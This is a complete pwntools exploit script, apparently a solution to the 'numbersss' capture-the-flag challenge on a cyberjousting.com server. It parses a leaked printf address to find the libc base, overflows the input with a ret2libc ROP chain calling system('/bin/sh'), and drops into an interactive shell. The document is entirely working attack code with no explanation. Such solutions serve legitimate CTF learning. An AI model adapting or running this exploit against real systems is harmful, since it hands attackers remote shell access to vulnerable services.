#!/usr/bin/env python3

from pwn import *

LOCAL_BINARY = "./numbersss"
REMOTE_IP = "numbersss.chal.cyberjousting.com"
REMOTE_PORT = 1351

elf = ELF(LOCAL_BINARY, checksec=False)
libc = ELF("./remote.libc.so", checksec=False)
context.binary = elf

p = remote(REMOTE_IP, REMOTE_PORT)

p.readuntil(b"Free junk: ")

leak = int(p.readline().decode(), 16)

libc.address = leak - libc.sym["printf"]

log.success(f"libc: 0x{libc.address:x}")

p.readline()

p.sendline(b"128")

POP_RDI = 0x240e5
RET = 0x401016

payload = b"A" * 0x18
payload += p64(libc.address + POP_RDI)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(RET)
payload += p64(libc.sym["system"])
payload = payload.ljust(128, b"B")

p.send(payload)

p.interactive()
